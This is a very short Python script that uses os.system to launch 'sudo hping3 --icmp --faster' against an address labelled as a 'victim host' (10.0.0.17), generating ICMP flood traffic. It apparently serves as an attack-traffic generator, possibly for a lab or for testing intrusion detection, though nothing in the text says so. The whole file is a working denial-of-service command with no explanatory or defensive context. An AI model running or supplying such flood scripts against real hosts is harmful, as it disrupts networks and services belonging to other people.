
import os

#victim host IP address 
destination="10.0.0.17"

#hping3 command for attack traffic
attack_traffic = 'sudo hping3 --icmp --faster ' + destination
os.system(attack_traffic)


